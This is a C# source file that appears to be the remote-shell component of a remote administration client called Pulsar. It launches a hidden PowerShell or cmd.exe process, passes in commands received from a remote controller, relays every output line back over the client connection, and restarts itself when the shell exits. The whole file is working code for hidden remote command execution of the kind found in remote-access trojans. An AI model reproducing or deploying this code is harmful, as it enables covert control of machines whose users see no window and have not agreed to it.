using Pulsar.Client.Networking;
using Pulsar.Common.Messages.Administration.RemoteShell;
using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;

namespace Pulsar.Client.IO
{
    public class Shell : IDisposable
    {
        private readonly PulsarClient _client;
        private Process _process;
        private StreamWriter _stdin;

        private bool _disposed;
        private readonly object _sync = new object();

        private string _currentMode = "powershell";

        // Ensures startup messages fire ONLY once
        private bool _startupCompleted = false;

        public Shell(PulsarClient client)
        {
            _client = client;
            StartShell();
        }


        private void StartShell()
        {
            if (_disposed) return;

            LaunchShell(_currentMode);

            // Prevent duplicate startup messages
            if (!_startupCompleted)
            {
                _startupCompleted = true;

                //_client.Send(new DoShellExecuteResponse
                //{
                //    Output = ">> Type 'exit' to close this session\n"
                //});

                _client.Send(new DoShellExecuteResponse
                {
                    Output = ">> New Shell Session Started\n"
                });
            }
        }


        private void LaunchShell(string mode)
        {
            lock (_sync)
            {
                if (_disposed) return;

                string file, args;

                if (mode == "powershell")
                {
                    file = "powershell.exe";
                    args = "-NoLogo -NoExit";
                }
                else
                {
                    file = "cmd.exe";
                    args = "/Q /K \"prompt CMD $P$G\"";
                }

                var psi = new ProcessStartInfo
                {
                    FileName = file,
                    Arguments = args,
                    UseShellExecute = false,
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    StandardOutputEncoding = Encoding.UTF8,
                    StandardErrorEncoding = Encoding.UTF8,
                    CreateNoWindow = true
                };

                _process = new Process
                {
                    StartInfo = psi,
                    EnableRaisingEvents = true
                };

                _process.OutputDataReceived += ProcessOutput;
                _process.ErrorDataReceived += ProcessOutput;
                _process.Exited += (_, __) => RestartShell();

                _process.Start();

                _stdin = _process.StandardInput;
                _stdin.AutoFlush = true;

                _process.BeginOutputReadLine();
                _process.BeginErrorReadLine();

                // Trigger prompt once
                if (mode == "powershell")
                {
                    try { _stdin.Write("\n"); _stdin.Flush(); } catch { }
                }
                else // CMD
                {
                    try { _stdin.Write("echo.\n"); _stdin.Flush(); } catch { }
                }
            }
        }


        private string _pendingCmdPrompt = null;

        private static readonly Regex CmdPromptRegex =
            new Regex(@"^[A-Z]:\\.*>$", RegexOptions.IgnoreCase);

        private void ProcessOutput(object sender, DataReceivedEventArgs e)
        {
            if (string.IsNullOrEmpty(e.Data))
                return;

            string line = e.Data.Replace("\r", "");

            if (_currentMode == "cmd")
            {
                // If this line IS a CMD prompt
                if (CmdPromptRegex.IsMatch(line))
                {
                    // ALWAYS print prompt on a new line
                    _client.Send(new DoShellExecuteResponse
                    {
                        Output = "\n" + line + "\n"
                    });

                    return;
                }

                // Normal output
                _client.Send(new DoShellExecuteResponse
                {
                    Output = line + "\n"
                });

                return;
            }

            // --------------------------------------------
            // PowerShell / normal mode
            // --------------------------------------------
            _client.Send(new DoShellExecuteResponse
            {
                Output = line + "\n"
            });
        }



        private void RestartShell()
        {
            lock (_sync)
            {
                if (_disposed) return;
                if (_process != null && !_process.HasExited)
                    return;

                DisposeProcessOnly();
                LaunchShell(_currentMode);
            }
        }


        public bool ExecuteCommand(string cmd)
        {
            if (_disposed) return false;

            if (cmd.StartsWith("##switchshell::"))
            {
                SwitchShell(cmd.Substring("##switchshell::".Length));
                return true;
            }

            if (cmd.Trim().Equals("cls", StringComparison.OrdinalIgnoreCase))
                cmd = _currentMode == "powershell" ? "Clear-Host" : "cls";

            lock (_sync)
            {
                try
                {
                    if (_process == null || _process.HasExited)
                        RestartShell();

                    if (_stdin == null)
                        return false;

                    const int chunkSize = 512;

                    for (int i = 0; i < cmd.Length; i += chunkSize)
                    {
                        string part = cmd.Substring(i, Math.Min(chunkSize, cmd.Length - i));
                        _stdin.Write(part);
                        _stdin.Flush();
                    }

                    _stdin.Write("\n\n");
                    _stdin.Flush();

                    return true;
                }
                catch
                {
                    RestartShell();
                    return false;
                }
            }
        }


        private void SwitchShell(string mode)
        {
            lock (_sync)
            {
                string normalized = (mode == "powershell") ? "powershell" : "cmd";

                // Already in shell → do nothing
                if (_currentMode == normalized)
                    return;

                _currentMode = normalized;

                DisposeProcessOnly();
                LaunchShell(_currentMode);

                _client.Send(new DoShellExecuteResponse
                {
                    Output = $">> Switched to {_currentMode}\n"
                });
            }
        }


        private void DisposeProcessOnly()
        {
            lock (_sync)
            {
                if (_process != null)
                {
                    try { _process.OutputDataReceived -= ProcessOutput; } catch { }
                    try { _process.ErrorDataReceived -= ProcessOutput; } catch { }
                    try { _stdin?.Close(); } catch { }
                    try { if (!_process.HasExited) _process.Kill(); } catch { }
                    try { _process.Dispose(); } catch { }
                }

                _stdin = null;
                _process = null;
            }
        }


        public void Dispose()
        {
            _disposed = true;
            DisposeProcessOnly();
        }
    }
}
